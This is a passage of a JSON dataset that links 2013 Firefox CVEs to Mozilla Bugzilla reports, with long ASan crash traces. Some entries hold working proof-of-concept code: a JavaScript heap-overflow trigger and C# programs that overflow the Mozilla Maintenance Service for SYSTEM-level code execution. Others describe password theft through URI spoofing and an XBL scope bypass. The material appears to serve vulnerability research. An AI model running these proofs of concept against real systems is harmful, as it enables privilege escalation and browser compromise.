mozilla::ErrorResult&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/dom/bindings/EventHandlerBinding.cpp:41:0 #137 0x7f934d037253 in JS::Value mozilla::dom::EventHandlerNonNull::Call<nsISupports*>(nsISupports* const&, nsDOMEvent&, mozilla::ErrorResult&, mozilla::dom::CallbackObject::ExceptionHandling) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/../../../dist/include/mozilla/dom/EventHandlerBinding.h:58:0 #138 0x7f934d035f2e in nsJSEventListener::HandleEvent(nsIDOMEvent*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/dom/src/events/nsJSEventListener.cpp:247:0 #139 0x7f934c9a204c in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, mozilla::dom::CallbackObjectHolder<mozilla::dom::EventListener, nsIDOMEventListener> const&, nsIDOMEvent*, mozilla::dom::EventTarget*, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventListenerManager.cpp:937:0 #140 0x7f934c9a27b1 in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventListenerManager.cpp:1008:0 #141 0x7f934c999e2b in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, bool, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:201:0 #142 0x7f934c9995bb in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, nsDispatchingCallback*, bool, nsCxPusher*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:326:0 #143 0x7f934c99b212 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<mozilla::dom::EventTarget>*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/events/src/nsEventDispatcher.cpp:632:0 #144 0x7f934c1462b9 in nsDocumentViewer::LoadComplete(tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/base/nsDocumentViewer.cpp:1035:0 #145 0x7f934d8beed4 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsDocShell.cpp:6657:0 #146 0x7f934d8bca0b in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsDocShell.cpp:6454:0 #147 0x7f934d8bce5f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsDocShell.cpp:6461:0 #148 0x7f934d8f7f95 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsDocLoader.cpp:1323:0 #149 0x7f934d8f769b in nsDocLoader::doStopDocumentLoad(nsIRequest*, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsDocLoader.cpp:865:0 #150 0x7f934d8f5a12 in nsDocLoader::DocLoaderIsEmpty(bool) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsDocLoader.cpp:755:0 #151 0x7f934d8f6eab in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsDocLoader.cpp:639:0 #152 0x7f934d8f73dc in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/uriloader/base/nsDocLoader.cpp:643:0 #153 0x7f934ba6585e in nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, tag_nsresult) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/netwerk/base/src/nsLoadGroup.cpp:684:0 #154 0x7f934c78c544 in nsDocument::DoUnblockOnload() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsDocument.cpp:7953:0 #155 0x7f934c78c2c1 in nsDocument::UnblockOnload(bool) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsDocument.cpp:7881:0 #156 0x7f934c775c18 in nsDocument::DispatchContentLoadedEvents() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsDocument.cpp:4625:0 #157 0x7f934c7aaa49 in nsRunnableMethodImpl<void (nsDocument::*)(), true>::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/../../../dist/include/nsThreadUtils.h:350:0 #158 0x7f934eb3828b in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/xpcom/threads/nsThread.cpp:626:0 #159 0x7f934ea84931 in NS_ProcessNextEvent(nsIThread*, bool) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/xpcom/build/nsThreadUtils.cpp:238:0 #160 0x7f934e03405b in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/ipc/glue/MessagePump.cpp:82:0 #161 0x7f934ebe5051 in MessageLoop::RunInternal() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/ipc/chromium/src/base/message_loop.cc:219:0 #162 0x7f934ebe4f4e in MessageLoop::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/ipc/chromium/src/base/message_loop.cc:186:0 #163 0x7f934de87851 in nsBaseAppShell::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/widget/xpwidgets/nsBaseAppShell.cpp:163:0 #164 0x7f934da2c67f in nsAppStartup::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/components/startup/nsAppStartup.cpp:269:0 #165 0x7f934b805a39 in XREMain::XRE_mainRun() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/xre/nsAppRunner.cpp:3851:0 #166 0x7f934b806d77 in XREMain::XRE_main(int, char**, nsXREAppData const*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/xre/nsAppRunner.cpp:3919:0 #167 0x7f934b807701 in XRE_main /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/xre/nsAppRunner.cpp:4121:0 #168 0x40c7e6 in do_main(int, char**, nsIFile*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/browser/app/nsBrowserApp.cpp:272:0 #169 0x40bd0f in main /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/browser/app/nsBrowserApp.cpp:632:0 #170 0x7f9358620ea4 in ?? ??:0 0x7f9328660368 is located 40 bytes inside of 144-byte region [0x7f9328660340,0x7f93286603d0) freed by thread T0 here: #0 0x43b0e0 in __interceptor_free ??:? #1 0x7f934c831bc3 in nsNodeUtils::LastRelease(nsINode*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsNodeUtils.cpp:259:0 #2 0x7f934c695710 in mozilla::dom::FragmentOrElement::Release() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/FragmentOrElement.cpp:1709:0 #3 0x7f934c9e9c2e in mozilla::dom::HTMLBodyElement::Release() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/html/content/src/HTMLBodyElement.cpp:203:0 #4 0x7f934b93cf94 in nsEvent::~nsEvent() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/../../dist/include/nsGUIEvent.h:659:0 #5 0x7f934c703251 in nsContentUtils::MaybeFireNodeRemoved(nsINode*, nsINode*, nsIDocument*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsContentUtils.cpp:3698:0 #6 0x7f934c802db3 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsINode.cpp:1646:0 #7 0x7f934cbd1707 in nsHTMLDocument::SetBody(nsGenericHTMLElement*, mozilla::ErrorResult&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/html/document/src/nsHTMLDocument.cpp:1132:0 #8 0x7f934e4ff309 in mozilla::dom::HTMLDocumentBinding::set_body(JSContext*, JS::Handle<JSObject*>, nsHTMLDocument*, JSJitSetterCallArgs) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:201:0 #9 0x7f934e4fbeb5 in mozilla::dom::HTMLDocumentBinding::genericSetter(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:1468:0 #10 0x7f934fdf5c48 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:349:0 #11 0x7f934fdf5395 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:381:0 #12 0x7f934fdf61f6 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:434:0 #13 0x7f934fdf729c in js::InvokeGetterOrSetter(JSContext*, JSObject*, JS::Value const&, unsigned int, JS::Value*, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:505:0 #14 0x7f93500fd3aa in js::CallSetter(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, int (*)(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, int, JS::MutableHandle<JS::Value>), unsigned int, unsigned int, int, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:452:0 previously allocated by thread T0 here: #0 0x43b1a0 in malloc ??:? #1 0x7f935693a417 in moz_xmalloc /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/memory/mozalloc/mozalloc.cpp:54:0 #2 0x7f934c9e89b3 in operator new(unsigned long) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/../../../../dist/include/mozilla/mozalloc.h:201:0 #3 0x7f934c9e89b3 in nsGenericHTMLElement* mozilla::dom::NewHTMLElementHelper::Create<nsHTMLBodyElement, mozilla::dom::HTMLBodyElement>(already_AddRefed<nsINodeInfo>, mozilla::dom::NewHTMLElementHelper::SFINAE<bool (*)(nsIDocument*), mozilla::dom::HTMLBodyElement::InNavQuirksMode>*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/html/content/src/nsGenericHTMLElement.h:1755:0 #4 0x7f934c04230f in nsContentDLF::CreateBlankDocument(nsILoadGroup*, nsIPrincipal*, nsIDocument**) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/layout/build/nsContentDLF.cpp:339:0 #5 0x7f934d8c16a5 in nsDocShell::CreateAboutBlankContentViewer(nsIPrincipal*, nsIURI*, bool) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsDocShell.cpp:7029:0 #6 0x7f934d8c0bbe in nsDocShell::EnsureContentViewer() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsDocShell.cpp:6931:0 #7 0x7f934d8982ec in nsDocShell::GetInterface(nsID const&, void**) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/docshell/base/nsDocShell.cpp:953:0 #8 0x7f934ea7e49a in nsGetInterface::operator()(nsID const&, void**) const /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/xpcom/build/nsIInterfaceRequestorUtils.cpp:19:0 #9 0x7f934c042f22 in nsCOMPtr<nsIDocument>::assign_from_helper(nsCOMPtr_helper const&, nsID const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/../../../dist/include/nsCOMPtr.h:1279:0 Shadow byte and word: 0x1ff2650cc06d: fd 0x1ff2650cc068: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ff2650cc048: 00 00 00 00 00 00 00 00 0x1ff2650cc050: 00 00 00 00 00 00 00 00 0x1ff2650cc058: 00 fb fb fb fb fb fb fb 0x1ff2650cc060: fa fa fa fa fa fa fa fa =>0x1ff2650cc068: fd fd fd fd fd fd fd fd 0x1ff2650cc070: fd fd fd fd fd fd fd fd 0x1ff2650cc078: fd fd fd fd fd fd fd fd 0x1ff2650cc080: fa fa fa fa fa fa fa fa 0x1ff2650cc088: 00 00 00 00 00 00 00 00 Stats: 228M malloced (209M for red zones) by 275886 calls Stats: 34M realloced by 15658 calls Stats: 198M freed by 138643 calls Stats: 158M really freed by 111109 calls Stats: 225M (57663 full pages) mmaped in 424 calls mmaps by size class: 7:102375; 8:42987; 9:14322; 10:8176; 11:7395; 12:1280; 13:960; 14:512; 15:192; 16:656; 17:452; 18:26; 19:36; 20:21; 21:1; mallocs by size class: 7:155185; 8:57875; 9:24083; 10:17401; 11:12951; 12:2170; 13:1907; 14:1418; 15:338; 16:1097; 17:1361; 18:35; 19:41; 20:22; 21:2; frees by size class: 7:69290; 8:21120; 9:16026; 10:14649; 11:11095; 12:1319; 13:1259; 14:1254; 15:231; 16:964; 17:1347; 18:30; 19:37; 20:21; 21:1; rfrees by size class: 7:56513; 8:16977; 9:10445; 10:12104; 11:9578; 12:1021; 13:994; 14:1137; 15:180; 16:803; 17:1323; 18:27; 19:5; 20:1; 21:1; Stats: malloc large: 2896 small slow: 4308 ==58460== ABORTING"
      }
    ],
    "CVE-2013-1705": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=882865",
        "title": "ASAN heap-buffer-overflow (read 1) in cryptojs_interpret_key_gen_type",
        "description": "The following JavaScript code crashes Firefox Nighly: o200 = document.documentElement; o1 = crypto; try{o1.generateCRMFRequest(o200.writeln,o200,'X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X',null,o1,1404343237,Math.PI,[]);}catch(e){} Asan: ==26839== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f76344d8c3f at pc 0x7f76595e4d0a bp 0x7fffeab94e80 sp 0x7fffeab94e78 READ of size 1 at 0x7f76344d8c3f thread T0 #0 0x7f76595e4d09 in cryptojs_interpret_key_gen_type(char*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/security/manager/ssl/src/nsCrypto.cpp:360:0 #1 0x7f76595dabe2 in cryptojs_ReadArgsAndGenerateKey(JSContext*, JS::Value*, nsKeyPairInfoStr*, nsIInterfaceRequestor*, PK11SlotInfoStr**, bool) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/security/manager/ssl/src/nsCrypto.cpp:947:0 #2 0x7f76595da0fc in nsCrypto::GenerateCRMFRequest(nsIDOMCRMFObject**) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/security/manager/ssl/src/nsCrypto.cpp:1980:0 #3 0x7f765a66fb05 in NS_InvokeByIndex /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162:0 #4 0x7f76592c4c63 in CallMethodHelper::Call() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/XPCWrappedNative.cpp:2267:0 #5 0x7f76592c4913 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/XPCWrappedNative.cpp:2233:0 #6 0x7f76592d9be7 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1480:0 #7 0x7f765b8f4c48 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:349:0 #8 0x7f765b8f4395 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:381:0 #9 0x7f765b8ee7fa in #10 0x7f765b8e2adc in js::RunScript(JSContext*, js::StackFrame*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:345:0 #11 0x7f765b8f65a4 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::AbstractFramePtr, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:530:0 #12 0x7f765b8f6bf7 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:569:0 #13 0x7f765ba75dcc in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsapi.cpp:5689:0 #14 0x7f7658a2d433 in nsJSContext::EvaluateString(nsAString_internal const&, JS::Handle<JSObject*>, JS::CompileOptions&, bool, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/dom/base/nsJSEnvironment.cpp:1278:0 #15 0x7f76589eecb9 in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/dom/base/nsGlobalWindow.cpp:10193:0 #16 0x7f76589db5cc in nsGlobalWindow::RunTimeout(nsTimeout*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/dom/base/nsGlobalWindow.cpp:10437:0 #17 0x7f76589ee1f7 in nsGlobalWindow::TimerCallback(nsITimer*, void*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/dom/base/nsGlobalWindow.cpp:10684:0 #18 0x7f765a64041c in nsTimerImpl::Fire() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/xpcom/threads/nsTimerImpl.cpp:543:0 #19 0x7f765a640c9c in nsTimerEvent::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/xpcom/threads/nsTimerImpl.cpp:627:0 #20 0x7f765a63728b in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/xpcom/threads/nsThread.cpp:626:0 #21 0x7f765a583931 in NS_ProcessNextEvent(nsIThread*, bool) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/xpcom/build/nsThreadUtils.cpp:238:0 #22 0x7f7659b3305b in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/ipc/glue/MessagePump.cpp:82:0 #23 0x7f765a6e4051 in MessageLoop::RunInternal() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/ipc/chromium/src/base/message_loop.cc:219:0 #24 0x7f765a6e3f4e in MessageLoop::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/ipc/chromium/src/base/message_loop.cc:186:0 #25 0x7f7659986851 in nsBaseAppShell::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/widget/xpwidgets/nsBaseAppShell.cpp:163:0 #26 0x7f765952b67f in nsAppStartup::Run() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/components/startup/nsAppStartup.cpp:269:0 #27 0x7f7657304a39 in XREMain::XRE_mainRun() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/xre/nsAppRunner.cpp:3851:0 #28 0x7f7657305d77 in XREMain::XRE_main(int, char**, nsXREAppData const*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/xre/nsAppRunner.cpp:3919:0 #29 0x7f7657306701 in XRE_main /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/toolkit/xre/nsAppRunner.cpp:4121:0 #30 0x40c7e6 in do_main(int, char**, nsIFile*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/browser/app/nsBrowserApp.cpp:272:0 #31 0x40bd0f in main /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/browser/app/nsBrowserApp.cpp:632:0 #32 0x7f766411fea4 in ?? ??:0 0x7f76344d8c3f is located 1 bytes to the left of 1-byte region [0x7f76344d8c40,0x7f76344d8c41) allocated by thread T0 here: #0 0x43b1a0 in malloc ??:? #1 0x7f765b89bf59 in js::MallocProvider<JSContext>::malloc_(unsigned long) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxt.h:558:0 #2 0x7f765c1811d7 in JS::LossyTwoByteCharsToNewLatin1CharsZ(JSContext*, JS::TwoByteChars) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/CharacterEncoding.cpp:21:0 #3 0x7f765ba7afeb in JS_EncodeString(JSContext*, JSString*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsapi.cpp:6293:0 #4 0x7f76592298c8 in JSAutoByteString::encodeLatin1(JSContext*, JSString*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jsapi.h:4431:0 #5 0x7f76595daba5 in cryptojs_ReadArgsAndGenerateKey(JSContext*, JS::Value*, nsKeyPairInfoStr*, nsIInterfaceRequestor*, PK11SlotInfoStr**, bool) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/security/manager/ssl/src/nsCrypto.cpp:945:0 #6 0x7f76595da0fc in nsCrypto::GenerateCRMFRequest(nsIDOMCRMFObject**) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/security/manager/ssl/src/nsCrypto.cpp:1980:0 #7 0x7f765a66fb05 in NS_InvokeByIndex /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162:0 #8 0x7f76592c4c63 in CallMethodHelper::Call() /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/xpconnect/src/XPCWrappedNative.cpp:2267:0 Shadow byte and word: 0x1feec689b187: fa 0x1feec689b180: fa fa fa fa fa fa fa fa More shadow bytes: 0x1feec689b160: fa fa fa fa fa fa fa fa 0x1feec689b168: 00 00 00 00 00 fb fb fb 0x1feec689b170: fa fa fa fa fa fa fa fa 0x1feec689b178: 00 00 02 fb fb fb fb fb =>0x1feec689b180: fa fa fa fa fa fa fa fa 0x1feec689b188: 01 fb fb fb fb fb fb fb 0x1feec689b190: fa fa fa fa fa fa fa fa 0x1feec689b198: fa fa fa fa fa fa fa fa 0x1feec689b1a0: fa fa fa fa fa fa fa fa Stats: 231M malloced (213M for red zones) by 286553 calls Stats: 34M realloced by 16332 calls Stats: 202M freed by 148988 calls Stats: 164M really freed by 111061 calls Stats: 228M (58432 full pages) mmaped in 430 calls mmaps by size class: 7:110565; 8:47081; 9:15345; 10:8176; 11:7395; 12:1280; 13:960; 14:512; 15:192; 16:656; 17:456; 18:26; 19:36; 20:21; 21:1; mallocs by size class: 7:161389; 8:61615; 9:24493; 10:17457; 11:12992; 12:2255; 13:1936; 14:1445; 15:341; 16:1164; 17:1366; 18:35; 19:41; 20:22; 21:2; frees by size class: 7:75283; 8:24634; 9:16504; 10:14756; 11:11180; 12:1355; 13:1293; 14:1281; 15:233; 16:1028; 17:1352; 18:30; 19:37; 20:21; 21:1; rfrees by size class: 7:56504; 8:16923; 9:10444; 10:12103; 11:9578; 12:1020; 13:995; 14:1136; 15:180; 16:804; 17:1323; 18:27; 19:22; 20:1; 21:1; Stats: malloc large: 2971 small slow: 4402"
      }
    ],
    "CVE-2013-1706": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=888361",
        "title": "Buffer overflow in WriteStatusFailure in maintenanceservice.exe",
        "description": "The WriteStatusFailure function in updatehelper.cpp fails to check the length of the update directory path provided before copying it into a string with a buffer of only MAX_PATH+1 length (http://hg.mozilla.org/mozilla-central/file/942686767e5e/toolkit/mozapps/update/common/updatehelper.cpp#l396). The maintenance service passes a user-provided argument directly into this function, which leads to a buffer overflow and potential arbitrary code execution with SYSTEM privileges. C# Proof-of-concept: using System; using System.ServiceProcess; namespace WriteStatusBufferOverflow { class Program { static void Main(string[] args) { try { ServiceController c = new ServiceController(\"MozillaMaintenance\"); c.Start(new string[] { \"aaa\", \"software-update\", @\"c:\\program files (x86)\\Mozilla Firefox\\updater.exe\", (new String('A',999)) }); } catch (Exception e) { Console.WriteLine(e); } } } } Replicated on Windows 7 x64 with maintenanceservice.exe version 23.0.0.4923. The result is an entry in the Windows application event log that looks similar to this: Faulting application name: maintenanceservice.exe, version: 23.0.0.4923, time stamp: 0x51c81b22 Faulting module name: maintenanceservice.exe, version: 23.0.0.4923, time stamp: 0x51c81b22 Exception code: 0xc0000409 Fault offset: 0x00004628 Faulting process id: 0x3728 Faulting application start time: 0x01ce74230b086bb8 Faulting application path: C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe Faulting module path: C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe ... Have attached a compiled proof-of-concept, let me know if you need any further details."
      }
    ],
    "CVE-2013-1707": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=888314",
        "title": "Buffer overflow in Updater",
        "description": "Using specially crafted arguments, an attacker can cause a buffer overflow in the updater executable (http://hg.mozilla.org/mozilla-central/file/942686767e5e/toolkit/mozapps/update/updater/updater.cpp#l2940). The maintenance service passes all arguments provided to it along to the updater, so it can be used to trigger the overflow which can potentially lead to arbitrary code execution with SYSTEM privileges. The vulnerability occurs when the /replace flag is given along with a long callback path. C# proof-of-concept: using System; using System.ServiceProcess; namespace ReplaceBufferOverflow { class Program { static void Main(string[] args) { try { ServiceController c = new ServiceController(\"MozillaMaintenance\"); c.Start(new string[] { \"aaa\", \"software-update\", @\"c:\\program files (x86)\\Mozilla Firefox\\updater.exe\", @\"c:\\program files (x86)\\Mozilla Firefox\", @\"c:\\Program Files (x86)\\Mozilla Firefox\\uninstall\", @\"/replace\", @\"CCCCC\", (new String('A',999)) }); } catch (Exception e) { Console.WriteLine(e); } } } } I can replicate on Windows 7 x64 with updater.exe version 22.0.0.4917 and maintenanceservice.exe version 23.0.0.4921. The result is an entry in the Windows application event log that looks similar to this: Event ID: 1000 Faulting application name: updater.exe, version: 22.0.0.4917, time stamp: 0x51c055c9 Faulting module name: unknown, version: 0.0.0.0, time stamp: 0x00000000 Exception code: 0xc0000005 Fault offset: 0x00410041 Faulting process id: 0x408 Faulting application start time: 0x01ce741487153860 Faulting application path: C:\\Program Files (x86)\\Mozilla Maintenance Service\\update\\updater.exe Faulting module path: unknown ... I have attached a compiled version of the proof-of-concept code, let me know if you need any further details."
      }
    ],
    "CVE-2013-1709": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=848253",
        "title": "It's possible to set a document's URI to a different document's URI",
        "description": "When a replace load happens in a subframe, nsDocShell::AddToSessionHistory reuses an existing SHEntry without creating a new BFCache entry. This can cause nsDocShell::InternalLoad to do a short-circuited load between different documents. By using this bug, it's possible to set a document's URI to a different document's URI. * An attacker can create a fake login page whose URI is a real login page's URI. And, if a password for the real login page was already saved in the Password Manager, an attacker can steal the password without user interaction. * An attacker can inject scripts into a page that uses external scripts with relative URLs."
      }
    ],
    "CVE-2013-1710": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=871368",
        "title": "Arbitrary code execution using crypto.generateCRMFRequest",
        "description": "nsCrypto::GenerateCRMFRequest uses JS_GetGlobalObject, so a callback script can be executed with a global object that is unrelated to the caller. This allows for a XSS attack or arbitrary code execution. Bug 871301 seems to fix this."
      }
    ],
    "CVE-2013-1711": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=843829",
        "title": "XBL scopes can be fooled by invoking XBL functions with non-native arguments",
        "description": "This is the root cause of bug 842255. Kudos for moz_bug_r_a4 for the clever test case. TL;DR - This allows clever pages to potentially circumvent the security advantages of XBL scopes and apply some of the same attacks that were possible on trunk before XBL scopes landed. Generally when privileged code gets its hands on a raw content JS object, it's the result of waiving Xray, and the object has an Xray waiver around it. However, there are cases where privileged code can get its hands on a content JS object without a waiver. The most obvious way to do this is to just do var withWaiver = contentWindow.wrappedJSObject.someExpando; var withoutWaiver = XPCNativeWrapper(withWaiver); In this case, we have |withWaiver != withoutWaiver|, because they're separate object identities. The former transitively applies Xray waivers, while the latter is just biding its time until it finds a native object, at which point Xray vision kicks back in, and content JS objects should theoretically be unreachable again. One could make the argument that we should have safer behavior here, and that objects without waivers should be opaque. I'm pretty sure that ship has sailed though (if it was ever even in port), and that changing that would break too much. Moreover, we actually rely on it with the XBL scope machinery: when an XBL scope accesses a field off of an bound node with Xray vision, we grab the underlying JS object (since there's not really much else to grab), but specifically avoid waiving Xray, so that Xray vision returns as soon as the caller traverses back to a node. One could make the argument taht this isn't very important behavior to preserve, since clever content can always circumvent it once the caller enters JS. Anyway. This normally isn't a security problem, because the Xray layer between chrome and content is generally complete modulo instances of waiving. However, in the XBL case we put the wrapped XBL functions on the content-accessible prototype, which content 